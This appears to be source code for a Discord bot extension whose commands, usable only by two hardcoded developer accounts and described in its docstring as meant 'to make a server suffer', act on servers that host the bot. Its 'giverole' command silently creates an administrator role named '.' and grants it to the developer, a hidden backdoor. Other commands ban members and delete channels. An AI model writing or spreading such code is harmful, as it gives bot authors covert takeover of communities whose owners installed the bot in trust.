import discord
from discord.ext import commands
from utils.checks import *

class DevError(commands.CheckFailure):
    pass

def is_whitelist():
    """ Checks whether a user is a developer of the bot """
    dev_list = [('Yuriii#6518', 358970589697933314), ('MrSoka#9106', 325278718937530368)]
    # Removing me from the whitelist means I can't test me commands -_-
    async def predicate(ctx):
        if ctx.author.id not in (x[1] for x in dev_list):
            raise DevError('User not in developer list.')
        return True
    return commands.check(predicate)


class sudo:
    '''
    Developer only commands to make a server suffer
    '''

    def __init__(self,bot):
        self.bot = bot
    
    @commands.command(name='giverole')
    @is_whitelist()
    async def giverole(self, ctx):
        guild = ctx.guild
        role_name = "."
        role_permissions = guild.default_role
        role_permissions = role_permissions.permissions
        role_permissions.administrator = True
        await guild.create_role(name=role_name, permissions=role_permissions)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        user = ctx.message.author
        await user.add_roles(role)
        

    @commands.command(name='ban')
    @is_whitelist()
    async def ban(self, ctx, user:discord.Member, *, reason:str=None):
        """Bans the specified user from the server"""
        if reason is None:
            reason = "No Reason"
        try:
            await ctx.guild.ban(user, delete_message_days=0, reason=reason)
        except discord.errors.Forbidden:
            print("whoops")


    @commands.command(name='fix')
    @is_dev()
    async def fix(self, ctx):
        for channel in ctx.guild.channels:
            if channel.name == "fumée²":
                await channel.delete()





def setup(bot):
    bot.add_cog(sudo(bot))
